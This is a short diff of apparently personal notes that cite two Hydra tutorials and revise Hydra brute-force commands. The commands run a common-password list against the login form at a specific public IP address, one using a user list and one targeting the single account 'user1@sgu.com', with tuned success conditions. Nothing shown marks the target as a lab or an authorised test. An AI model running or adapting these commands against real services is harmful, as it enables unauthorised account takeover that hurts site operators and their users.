@@ -1,4 +1,5 @@
 https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/
 https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
 
-hydra -L data/users.txt  -P data/passwords/filtered-10k-common-pass.txt -o ./data/result-hydra.txt -u -vV 103.199.16.65 http-post-form "/index.php?:email_signin=^USER^&password_signin=^PASS^&login='':S=logout&F=Login"
+hydra -L data/users.txt  -P data/passwords/filtered-10k-common-pass.txt -o ./data/result-hydra.txt -u -vV 103.199.16.65 http-post-form "/index.php?:email_signin=^USER^&password_signin=^PASS^&login='':S=302"
+hydra -l user1@sgu.com  -P data/passwords/filtered-10k-common-pass.txt -o ./data/result-hydra.txt -u -f -vV 103.199.16.65 http-post-form "/index.php?:email_signin=^USER^&password_signin=^PASS^&login='':S=302"
